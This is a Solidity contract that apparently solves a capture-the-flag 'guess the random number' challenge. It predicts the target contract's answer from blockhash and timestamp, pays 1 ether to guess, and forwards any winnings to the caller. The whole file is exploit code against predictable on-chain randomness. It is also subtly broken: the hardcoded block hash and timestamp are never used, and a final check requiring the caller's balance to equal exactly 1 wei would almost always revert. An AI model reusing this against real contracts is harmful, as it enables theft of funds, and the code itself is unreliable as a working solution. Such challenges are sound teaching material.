// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;
interface IGuessTheRandomNumberChallenge {
  function guess(uint8) external payable;
}

contract GuessTheRandomNumberSolver {
  IGuessTheRandomNumberChallenge public _interface;
address payable public caller ; 
  bytes32 public previousBlockHash = 0x66bcdb5e320c9e0c04a9fdeaa15de33a4c8a040db342f4f955fa54f170dba9ce;
  uint public previousTimestamp = 1641520092;

  constructor() {
    _interface = IGuessTheRandomNumberChallenge(0x8E6c4686c6559d5891e601CC7b77D8f5D67A8994);
  }
  
  function solve() public payable {
        caller = payable(msg.sender);

    require(msg.value>= 1 ether,"necesary ether");
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        require(answer>0,"answer<0");

    _interface.guess{value: 1 ether}(answer);
    require(caller.balance==1,"no trans");
  }


  receive() external payable {
      payable(caller).transfer(address(this).balance);
  }
}